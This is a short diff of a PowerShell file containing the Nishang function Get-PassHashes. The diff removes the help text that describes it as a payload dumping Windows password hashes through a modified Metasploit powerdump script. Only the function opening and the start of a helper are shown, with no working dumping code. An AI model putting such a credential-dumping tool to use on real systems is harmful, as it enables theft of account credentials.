@@ -1,25 +1,8 @@
 function Get-PassHashes { 
-<# 
-.SYNOPSIS 
-Nishang payload which dumps password hashes. 
- 
-.DESCRIPTION 
-The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
-(but not SYSTEM privs as for the original powerdump)
 
-.EXAMPLE 
-PS > Get-PassHashes
- 
-.LINK 
-http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
-https://github.com/samratashok/nishang
-
-#> 
 [CmdletBinding()]
 Param ()
 
-
-#######################################powerdump written by David Kennedy#########################################
 function LoadApi
 {
     $oldErrorAction = $global:ErrorActionPreference;
